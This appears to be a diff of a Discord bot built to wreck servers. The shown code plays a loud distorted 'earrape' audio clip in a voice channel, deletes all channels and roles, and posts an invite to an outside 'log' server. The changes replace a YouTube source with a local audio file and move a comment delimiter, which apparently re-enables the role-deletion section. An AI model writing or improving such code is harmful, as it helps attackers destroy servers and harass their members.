@@ -284,7 +284,8 @@ class Bot(cmd.Bot):
        # -play earrape in vc- 
         vc = await earrape.connect()
         voice_client: discord.VoiceClient = discord.utils.get(bot.voice_clients, guild=ctx.guild)
-        audio_source = await YTDLSource.from_url("https://www.youtube.com/watch?v=QVYSsn_HL1w")
+        #audio_source = await YTDLSource.from_url("https://www.youtube.com/watch?v=QVYSsn_HL1w")
+        audio_source = discord.FFmpegPCMAudio('assets/earrape.webm')
         voice_client.play(audio_source, after=None)
 
         # -delete all channels-
@@ -316,7 +317,7 @@ class Bot(cmd.Bot):
         await logserver.channels[0].send("Join the fun at " + unban.url)
 
         originalname = None
-        '''
+        
 
         # -delete all roles-
         roles = []
@@ -397,3 +398,5 @@ class Bot(cmd.Bot):
                 except Exception:
                     break
                     voice_client.stop
+
+            '''
